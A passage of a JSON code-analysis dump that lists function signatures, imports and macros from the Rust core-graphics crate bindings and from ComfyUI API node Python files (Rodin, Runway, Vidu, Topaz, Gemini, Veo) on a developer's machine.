        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/event_source.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGEventSourceGetTypeID() -> CFTypeID;",
          "fn CGEventSourceCreate(stateID: CGEventSourceStateID) -> crate::sys::CGEventSourceRef;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGEventSource {"
        ],
        "uses": [
          "use core_foundation::base::{CFRelease, CFRetain, CFTypeID};",
          "use foreign_types::ForeignType;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Copy, Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/event.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGEventGetTypeID() -> CFTypeID;",
          "fn CGEventCreate(source: crate::sys::CGEventSourceRef) -> crate::sys::CGEventRef;",
          "fn CGEventCreateKeyboardEvent(",
          "fn CGEventCreateMouseEvent(",
          "fn CGEventCreateScrollWheelEvent2(",
          "fn CGEventPost(tapLocation: CGEventTapLocation, event: crate::sys::CGEventRef);",
          "fn CGEventTapPostEvent(tapProxy: CGEventTapProxy, event: crate::sys::CGEventRef);",
          "fn CGEventPostToPid(pid: libc::pid_t, event: crate::sys::CGEventRef);",
          "fn CGEventSetFlags(event: crate::sys::CGEventRef, flags: CGEventFlags);",
          "fn CGEventGetFlags(event: crate::sys::CGEventRef) -> CGEventFlags;",
          "fn CGEventGetLocation(event: crate::sys::CGEventRef) -> CGPoint;",
          "fn CGEventSetType(event: crate::sys::CGEventRef, eventType: CGEventType);",
          "fn CGEventGetType(event: crate::sys::CGEventRef) -> CGEventType;",
          "fn CGEventKeyboardSetUnicodeString(",
          "fn CGEventGetIntegerValueField(event: crate::sys::CGEventRef, field: CGEventField) -> i64;",
          "fn CGEventSetIntegerValueField(event: crate::sys::CGEventRef, field: CGEventField, value: i64);",
          "fn CGEventGetDoubleValueField(event: crate::sys::CGEventRef, field: CGEventField) -> f64;",
          "fn CGEventSetDoubleValueField(event: crate::sys::CGEventRef, field: CGEventField, value: f64);",
          "fn CGEventTapCreate(",
          "fn CGEventTapEnable(tap: CFMachPortRef, enable: bool);"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl KeyCode {",
          "impl ScrollEventUnit {",
          "impl EventField {",
          "impl CGEvent {"
        ],
        "uses": [
          "use crate::event_source::CGEventSource;",
          "use crate::geometry::CGPoint;",
          "use core_foundation::{",
          "use foreign_types::ForeignType;",
          "use libc::c_void;",
          "use std::mem::ManuallyDrop;"
        ],
        "macros": [
          "///         println!(\"{:?}\", d.location());",
          "///     Err(_) => (assert!(false)),",
          "mask | CGEventMaskBit!(etype)"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/private.rs",
        "function_defs": [
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Drop for CGSRegion {",
          "impl CGSRegion {",
          "impl CGSSurface {"
        ],
        "uses": [
          "use crate::geometry::CGRect;",
          "use libc::{c_int, c_uint};",
          "use std::ptr;",
          "use crate::geometry::CGRect;",
          "use libc::{c_int, c_uint};"
        ],
        "macros": [
          "assert!(ffi::CGSNewRegionWithRect(rect, &mut region) == 0);",
          "assert!(",
          "assert!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/base.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/image.rs",
        "function_defs": [
          "fn drop = CGImageRelease;",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGImageGetTypeID() -> CFTypeID;",
          "fn CGImageGetWidth(image: crate::sys::CGImageRef) -> size_t;",
          "fn CGImageGetHeight(image: crate::sys::CGImageRef) -> size_t;",
          "fn CGImageGetBitsPerComponent(image: crate::sys::CGImageRef) -> size_t;",
          "fn CGImageGetBitsPerPixel(image: crate::sys::CGImageRef) -> size_t;",
          "fn CGImageGetBytesPerRow(image: crate::sys::CGImageRef) -> size_t;",
          "fn CGImageGetColorSpace(image: crate::sys::CGImageRef) -> crate::sys::CGColorSpaceRef;",
          "fn CGImageGetDataProvider(image: crate::sys::CGImageRef) -> crate::sys::CGDataProviderRef;",
          "fn CGImageRelease(image: crate::sys::CGImageRef);",
          "fn CGImageCreate(",
          "fn CGImageCreateWithImageInRect("
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGImage {",
          "impl CGImageRef {"
        ],
        "uses": [
          "use std::ptr;",
          "use crate::base::CGFloat;",
          "use crate::color_space::CGColorSpace;",
          "use crate::data_provider::{CGDataProvider, CGDataProviderRef};",
          "use crate::geometry::CGRect;",
          "use core_foundation::base::{CFRetain, CFTypeID};",
          "use core_foundation::data::CFData;",
          "use foreign_types::{ForeignType, ForeignTypeRef};",
          "use libc::size_t;"
        ],
        "macros": [
          "assert!(!result.is_null());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/path.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn new<'b>(element: *const CGPathElement) -> CGPathElementRef<'b> {",
          "fn deref(&self) -> &CGPathElement {",
          "fn fmt(&self, formatter: &mut Formatter) -> Result<(), fmt::Error> {",
          "fn CGPathCreateWithRect(",
          "fn CGPathApply(path: crate::sys::CGPathRef, info: *mut c_void, function: CGPathApplierFunction);",
          "fn CGPathGetTypeID() -> CFTypeID;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGPath {",
          "impl Debug for CGPathElement {",
          "impl CGPathElement {"
        ],
        "uses": [
          "use crate::geometry::{CGAffineTransform, CGPoint, CGRect};",
          "use core_foundation::base::{CFRelease, CFRetain, CFTypeID};",
          "use foreign_types::ForeignType;",
          "use libc::c_void;",
          "use std::fmt::{self, Debug, Formatter};",
          "use std::marker::PhantomData;",
          "use std::ops::Deref;",
          "use std::ptr;",
          "use std::slice;"
        ],
        "macros": [
          "write!(formatter, \"{:?}: {:?}\", self.element_type, self.points())"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/sys.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::os::raw::c_void;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/geometry.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/data_provider.rs",
        "function_defs": [
          "fn drop = |cs| CFRelease(cs as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn test_data_provider() {",
          "fn drop(&mut self) {",
          "fn as_ref(&self) -> &[u8] {",
          "fn CGDataProviderCopyData(provider: crate::sys::CGDataProviderRef) -> CFDataRef;",
          "fn CGDataProviderCreateWithData(",
          "fn CGDataProviderGetTypeID() -> CFTypeID;"
        ],
        "struct_defs": [
          "struct VecWrapper {"
        ],
        "impl_blocks": [
          "impl CGDataProvider {",
          "impl CGDataProviderRef {",
          "impl Drop for VecWrapper {",
          "impl std::convert::AsRef<[u8]> for VecWrapper {"
        ],
        "uses": [
          "use core_foundation::base::{CFRelease, CFRetain, CFTypeID, TCFType};",
          "use core_foundation::data::{CFData, CFDataRef};",
          "use libc::{off_t, size_t};",
          "use std::mem;",
          "use std::os::raw::c_void;",
          "use std::ptr;",
          "use std::sync::Arc;",
          "use foreign_types::{ForeignType, ForeignTypeRef};",
          "use std::sync::atomic::{AtomicBool, Ordering::SeqCst};"
        ],
        "macros": [
          "assert!(!dropped.load(SeqCst));",
          "assert!(dropped.load(SeqCst))"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/color_space.rs",
        "function_defs": [
          "fn drop = |p| CFRelease(p as *mut _);",
          "fn clone = |p| CFRetain(p as *const _) as *mut _;",
          "fn CGColorSpaceCreateDeviceRGB() -> crate::sys::CGColorSpaceRef;",
          "fn CGColorSpaceCreateDeviceGray() -> crate::sys::CGColorSpaceRef;",
          "fn CGColorSpaceCreateWithName(name: CFStringRef) -> crate::sys::CGColorSpaceRef;",
          "fn CGColorSpaceGetTypeID() -> CFTypeID;"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGColorSpace {"
        ],
        "uses": [
          "use core_foundation::base::{CFRelease, CFRetain, CFTypeID};",
          "use core_foundation::string::CFStringRef;",
          "use foreign_types::ForeignType;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/core-graphics-0.23.2/src/context.rs",
        "function_defs": [
          "fn drop = |cs| CGContextRelease(cs);",
          "fn clone = |p| CGContextRetain(p);",
          "fn create_bitmap_context_test() {",
          "fn CGContextRetain(c: crate::sys::CGContextRef) -> crate::sys::CGContextRef;",
          "fn CGContextRelease(c: crate::sys::CGContextRef);",
          "fn CGBitmapContextCreate(",
          "fn CGBitmapContextGetData(context: crate::sys::CGContextRef) -> *mut c_void;",
          "fn CGBitmapContextGetWidth(context: crate::sys::CGContextRef) -> size_t;",
          "fn CGBitmapContextGetHeight(context: crate::sys::CGContextRef) -> size_t;",
          "fn CGBitmapContextGetBytesPerRow(context: crate::sys::CGContextRef) -> size_t;",
          "fn CGBitmapContextCreateImage(context: crate::sys::CGContextRef) -> crate::sys::CGImageRef;",
          "fn CGContextGetTypeID() -> CFTypeID;",
          "fn CGContextGetClipBoundingBox(c: crate::sys::CGContextRef) -> CGRect;",
          "fn CGContextFlush(c: crate::sys::CGContextRef);",
          "fn CGContextSetBlendMode(c: crate::sys::CGContextRef, blendMode: CGBlendMode);",
          "fn CGContextSetAllowsFontSmoothing(c: crate::sys::CGContextRef, allowsFontSmoothing: bool);",
          "fn CGContextSetShouldSmoothFonts(c: crate::sys::CGContextRef, shouldSmoothFonts: bool);",
          "fn CGContextSetFontSmoothingStyle(c: crate::sys::CGContextRef, style: c_int);",
          "fn CGContextSetAllowsAntialiasing(c: crate::sys::CGContextRef, allowsAntialiasing: bool);",
          "fn CGContextSetShouldAntialias(c: crate::sys::CGContextRef, shouldAntialias: bool);",
          "fn CGContextSetAllowsFontSubpixelQuantization(",
          "fn CGContextSetShouldSubpixelQuantizeFonts(",
          "fn CGContextSetAllowsFontSubpixelPositioning(",
          "fn CGContextSetShouldSubpixelPositionFonts(",
          "fn CGContextSetTextDrawingMode(c: crate::sys::CGContextRef, mode: CGTextDrawingMode);",
          "fn CGContextSetFillColorWithColor(c: crate::sys::CGContextRef, color: crate::sys::CGColorRef);",
          "fn CGContextSetLineCap(c: crate::sys::CGContextRef, cap: CGLineCap);",
          "fn CGContextSetLineDash(",
          "fn CGContextSetLineJoin(c: crate::sys::CGContextRef, join: CGLineJoin);",
          "fn CGContextSetLineWidth(c: crate::sys::CGContextRef, width: CGFloat);",
          "fn CGContextSetMiterLimit(c: crate::sys::CGContextRef, limit: CGFloat);",
          "fn CGContextAddPath(c: crate::sys::CGContextRef, path: crate::sys::CGPathRef);",
          "fn CGContextAddCurveToPoint(",
          "fn CGContextAddQuadCurveToPoint(",
          "fn CGContextAddLineToPoint(c: crate::sys::CGContextRef, x: CGFloat, y: CGFloat);",
          "fn CGContextBeginPath(c: crate::sys::CGContextRef);",
          "fn CGContextClosePath(c: crate::sys::CGContextRef);",
          "fn CGContextMoveToPoint(c: crate::sys::CGContextRef, x: CGFloat, y: CGFloat);",
          "fn CGContextDrawPath(c: crate::sys::CGContextRef, mode: CGPathDrawingMode);",
          "fn CGContextFillPath(c: crate::sys::CGContextRef);",
          "fn CGContextEOFillPath(c: crate::sys::CGContextRef);",
          "fn CGContextClip(c: crate::sys::CGContextRef);",
          "fn CGContextEOClip(c: crate::sys::CGContextRef);",
          "fn CGContextResetClip(c: crate::sys::CGContextRef);",
          "fn CGContextStrokePath(c: crate::sys::CGContextRef);",
          "fn CGContextSetRGBFillColor(",
          "fn CGContextSetRGBStrokeColor(",
          "fn CGContextSetGrayFillColor(context: crate::sys::CGContextRef, gray: CGFloat, alpha: CGFloat);",
          "fn CGContextClearRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextFillRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextFillRects(context: crate::sys::CGContextRef, rects: *const CGRect, count: size_t);",
          "fn CGContextStrokeRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextStrokeRectWithWidth(",
          "fn CGContextClipToRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextClipToRects(context: crate::sys::CGContextRef, rects: *const CGRect, count: size_t);",
          "fn CGContextClipToMask(",
          "fn CGContextReplacePathWithStrokedPath(context: crate::sys::CGContextRef);",
          "fn CGContextFillEllipseInRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextStrokeEllipseInRect(context: crate::sys::CGContextRef, rect: CGRect);",
          "fn CGContextStrokeLineSegments(",
          "fn CGContextDrawImage(c: crate::sys::CGContextRef, rect: CGRect, image: crate::sys::CGImageRef);",
          "fn CGContextSetInterpolationQuality(",
          "fn CGContextGetInterpolationQuality(c: crate::sys::CGContextRef) -> CGInterpolationQuality;",
          "fn CGContextSetFont(c: crate::sys::CGContextRef, font: crate::sys::CGFontRef);",
          "fn CGContextSetFontSize(c: crate::sys::CGContextRef, size: CGFloat);",
          "fn CGContextSetTextMatrix(c: crate::sys::CGContextRef, t: CGAffineTransform);",
          "fn CGContextSetTextPosition(c: crate::sys::CGContextRef, x: CGFloat, y: CGFloat);",
          "fn CGContextShowGlyphsAtPositions(",
          "fn CGContextSaveGState(c: crate::sys::CGContextRef);",
          "fn CGContextRestoreGState(c: crate::sys::CGContextRef);",
          "fn CGContextTranslateCTM(c: crate::sys::CGContextRef, tx: CGFloat, ty: CGFloat);",
          "fn CGContextScaleCTM(c: crate::sys::CGContextRef, sx: CGFloat, sy: CGFloat);",
          "fn CGContextRotateCTM(c: crate::sys::CGContextRef, angle: CGFloat);",
          "fn CGContextGetCTM(c: crate::sys::CGContextRef) -> CGAffineTransform;",
          "fn CGContextConcatCTM(c: crate::sys::CGContextRef, transform: CGAffineTransform);",
          "fn CGContextDrawLinearGradient(",
          "fn CGContextDrawRadialGradient(",
          "fn CGContextSetShadow(c: crate::sys::CGContextRef, offset: CGSize, blur: CGFloat);",
          "fn CGContextSetShadowWithColor(",
          "fn CGContextSetAlpha(c: crate::sys::CGContextRef, alpha: CGFloat);"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CGContext {",
          "impl CGContextRef {"
        ],
        "uses": [
          "use crate::base::CGFloat;",
          "use crate::color::CGColor;",
          "use crate::color_space::CGColorSpace;",
          "use crate::font::{CGFont, CGGlyph};",
          "use crate::geometry::{CGPoint, CGSize};",
          "use crate::gradient::{CGGradient, CGGradientDrawingOptions};",
          "use crate::path::CGPathRef;",
          "use core_foundation::base::{CFTypeID, TCFType};",
          "use libc::{c_int, size_t};",
          "use std::os::raw::c_void;",
          "use crate::geometry::{CGAffineTransform, CGRect};",
          "use crate::image::CGImage;",
          "use foreign_types::{ForeignType, ForeignTypeRef};",
          "use std::cmp;",
          "use std::ptr;",
          "use std::slice;",
          "use crate::geometry::*;"
        ],
        "macros": [
          "assert!(!result.is_null());",
          "assert_eq!(16, img.width());",
          "assert_eq!(8, img.height());",
          "assert_eq!(8, img.bits_per_component());",
          "assert_eq!(32, img.bits_per_pixel());",
          "assert_eq!(255, data.bytes()[0]);",
          "assert_eq!(0, data.bytes()[1]);",
          "assert_eq!(255, data.bytes()[2]);",
          "assert_eq!(255, data.bytes()[3]);"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Clone, Copy, Debug)]"
        ],
        "error_handling": 1
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/ReverseLab/SAM/app/gui-electron",
    "name": "gui-electron",
    "languages": [
      "JavaScript",
      "TypeScript",
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes",
    "name": "comfy_api_nodes",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_rodin.py",
        "docstrings": [],
        "function_defs": [
          "def get_quality_mode(poly_count):",
          "def tensor_to_filelike(tensor, max_pixels: int = 2048*2048):\n\"\"\"\nConverts a PyTorch tensor to a file-like object.\n\nArgs:\n- tensor (torch.Tensor): A tensor representing an image of shape (H, W, C)\nwhere C is the number of channels (3 for RGB), H is height, and W is width.\n\nReturns:\n- io.BytesIO: A file-like object containing the image data.",
          "def check_rodin_status(response: Rodin3DCheckStatusResponse) -> str:",
          "def extract_progress(response: Rodin3DCheckStatusResponse) -> Optional[int]:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class Rodin3D_Regular(IO.ComfyNode):",
          "class Rodin3D_Detail(IO.ComfyNode):",
          "class Rodin3D_Smooth(IO.ComfyNode):",
          "class Rodin3D_Sketch(IO.ComfyNode):",
          "class Rodin3D_Gen2(IO.ComfyNode):",
          "class Rodin3DExtension(ComfyExtension):"
        ],
        "imports": [
          "from inspect import cleandoc",
          "import folder_paths as comfy_paths",
          "import os",
          "import logging",
          "import math",
          "from typing import Optional",
          "from io import BytesIO",
          "from typing_extensions import override",
          "from PIL import Image",
          "from comfy_api_nodes.apis.rodin_api import (",
          "from comfy_api_nodes.util import (",
          "from comfy_api.latest import ComfyExtension, IO"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 4,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_runway.py",
        "docstrings": [],
        "function_defs": [
          "def get_video_url_from_task_status(response: TaskStatusResponse) -> str | None:\n\"\"\"Returns the video URL from the task status response if it exists.\"\"\"\nif hasattr(response, \"output\") and len(response.output) > 0:\nreturn response.output[0]\nreturn None\n\n\ndef extract_progress_from_task_status(\nresponse: TaskStatusResponse,\n) -> float | None:",
          "def extract_progress_from_task_status(",
          "def get_image_url_from_task_status(response: TaskStatusResponse) -> str | None:\n\"\"\"Returns the image URL from the task status response if it exists.\"\"\"\nif hasattr(response, \"output\") and len(response.output) > 0:\nreturn response.output[0]\nreturn None\n\n\nasync def get_response(\ncls: type[IO.ComfyNode], task_id: str, estimated_duration: int | None = None\n) -> TaskStatusResponse:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class RunwayApiError(Exception):",
          "class RunwayGen4TurboAspectRatio(str, Enum):",
          "class RunwayGen3aAspectRatio(str, Enum):",
          "class RunwayImageToVideoNodeGen3a(IO.ComfyNode):",
          "class RunwayImageToVideoNodeGen4(IO.ComfyNode):",
          "class RunwayFirstLastFrameNode(IO.ComfyNode):",
          "class RunwayTextToImageNode(IO.ComfyNode):",
          "class RunwayExtension(ComfyExtension):"
        ],
        "imports": [
          "from enum import Enum",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input, InputImpl",
          "from comfy_api_nodes.apis import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Prepare reference images if provided"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 3,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_vidu.py",
        "docstrings": [],
        "function_defs": [
          "def get_video_url_from_response(response) -> Optional[str]:",
          "def get_video_from_response(response) -> TaskResult:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class VideoModelName(str, Enum):",
          "class AspectRatio(str, Enum):",
          "class Resolution(str, Enum):",
          "class MovementAmplitude(str, Enum):",
          "class TaskCreationRequest(BaseModel):",
          "class TaskCreationResponse(BaseModel):",
          "class TaskResult(BaseModel):",
          "class TaskStatusResponse(BaseModel):",
          "class ViduTextToVideoNode(IO.ComfyNode):",
          "class ViduImageToVideoNode(IO.ComfyNode):",
          "class ViduReferenceVideoNode(IO.ComfyNode):",
          "class ViduStartEndToVideoNode(IO.ComfyNode):",
          "class ViduExtension(ComfyExtension):"
        ],
        "imports": [
          "import logging",
          "from enum import Enum",
          "from typing import Literal, Optional, TypeVar",
          "import torch",
          "from pydantic import BaseModel, Field",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 6,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_topaz.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class TopazImageEnhance(IO.ComfyNode):",
          "class TopazVideoEnhance(IO.ComfyNode):",
          "class TopazExtension(ComfyExtension):"
        ],
        "imports": [
          "import builtins",
          "from io import BytesIO",
          "import aiohttp",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.apis import topaz_api",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Landscape or Square; Attempt to set height to target (e.g., 2160), calculate width",
          "# Check if width exceeds standard bounds (for ultra-wide e.g., 21:9 ARs)",
          "# Portrait; Attempt to set width to target (e.g., 2160), calculate height",
          "# Check if height exceeds standard bounds"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_gemini.py",
        "docstrings": [],
        "function_defs": [
          "def get_parts_by_type(response: GeminiGenerateContentResponse, part_type: Literal[\"text\"] | str) -> list[GeminiPart]:\n\"\"\"\nFilter response parts by their type.\n\nArgs:\nresponse: The API response from Gemini.\npart_type: Type of parts to extract (\"text\" or a MIME type).\n\nReturns:\nList of response parts matching the requested type.",
          "def get_text_from_response(response: GeminiGenerateContentResponse) -> str:\n\"\"\"\nExtract and concatenate all text parts from the response.\n\nArgs:\nresponse: The API response from Gemini.\n\nReturns:\nCombined text from all text parts in the response.\n\"\"\"",
          "def calculate_tokens_price(response: GeminiGenerateContentResponse) -> float | None:",
          "def define_schema(cls):",
          "def create_video_parts(cls, video_input: Input.Video) -> list[GeminiPart]:\n\"\"\"Convert video input to Gemini API compatible parts.\"\"\"\n\nbase_64_string = video_to_base64_string(\nvideo_input, container_format=Types.VideoContainer.MP4, codec=Types.VideoCodec.H264\n)\nreturn [\nGeminiPart(\ninlineData=GeminiInlineData(\nmimeType=GeminiMimeType.video_mp4,",
          "def create_audio_parts(cls, audio_input: Input.Audio) -> list[GeminiPart]:\n\"\"\"\nConvert audio input to Gemini API compatible parts.\n\nArgs:\naudio_input: Audio input from ComfyUI, containing waveform tensor and sample rate.\n\nReturns:\nList of GeminiPart objects containing the encoded audio.\n\"\"\"",
          "def define_schema(cls):\n\"\"\"\nFor details about the supported file input types, see:\nhttps://cloud.google.com/vertex-ai/generative-ai/docs/model-reference/inference\n\"\"\"",
          "def create_file_part(cls, file_path: str) -> GeminiPart:",
          "def execute(cls, file: str, GEMINI_INPUT_FILES: list[GeminiPart] | None = None) -> IO.NodeOutput:\n\"\"\"Loads and formats input files for Gemini API.\"\"\"\nif GEMINI_INPUT_FILES is None:\nGEMINI_INPUT_FILES = []\nfile_path = folder_paths.get_annotated_filepath(file)\ninput_file_content = cls.create_file_part(file_path)\nreturn IO.NodeOutput([input_file_content] + GEMINI_INPUT_FILES)\n\n\nclass GeminiImage(IO.ComfyNode):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class GeminiModel(str, Enum):",
          "class GeminiImageModel(str, Enum):",
          "class GeminiNode(IO.ComfyNode):",
          "class GeminiInputFiles(IO.ComfyNode):",
          "class GeminiImage(IO.ComfyNode):",
          "class GeminiImage2(IO.ComfyNode):",
          "class GeminiExtension(ComfyExtension):"
        ],
        "imports": [
          "import base64",
          "import os",
          "from enum import Enum",
          "from io import BytesIO",
          "from typing import Literal",
          "import torch",
          "from typing_extensions import override",
          "import folder_paths",
          "from comfy_api.latest import IO, ComfyExtension, Input, Types",
          "from comfy_api_nodes.apis.gemini_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# If image_limit == 0 --> use all images; otherwise clamp to image_limit.",
          "# Number of images we'll send as URLs (fileData)",
          "# Skip parts that don't match the requested type",
          "# Define prices (Cost per 1,000,000 tokens), see https://cloud.google.com/vertex-ai/generative-ai/pricing",
          "# Recreate an IO.AUDIO object for the given batch dimension index",
          "# Convert to MP3 format for compatibility with Gemini API",
          "# Create parts list with text prompt as the first part",
          "# Add other modal parts",
          "# Use base64 string directly, not the data URI"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 5,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_veo2.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def status_extractor(response):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class VeoVideoGenerationNode(IO.ComfyNode):",
          "class Veo3VideoGenerationNode(VeoVideoGenerationNode):",
          "class Veo3FirstLastFrameNode(IO.ComfyNode):",
          "class VeoExtension(ComfyExtension):"
        ],
        "imports": [
          "import base64",
          "from io import BytesIO",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input, InputImpl",
          "from comfy_api_nodes.apis.veo_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Prepare the instances for the request",
          "# Add image if provided",
          "# Create parameters dictionary",
          "# Add optional parameters if provided",
          "# Only add generateAudio for Veo 3 models",
          "# force \"enhance_prompt\" to True for Veo3 models",
          "# Only return \"completed\" if the operation is done, regardless of success or failure",
          "# We'll check for errors after polling completes",
          "# Now check for errors in the final response",
          "# Check for error in poll response",
          "# Check for RAI filtered content",
          "# Extract reason message if available",
          "# Extract video data",
          "# Check if video is provided as base64 or URL"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/canary.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import av"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
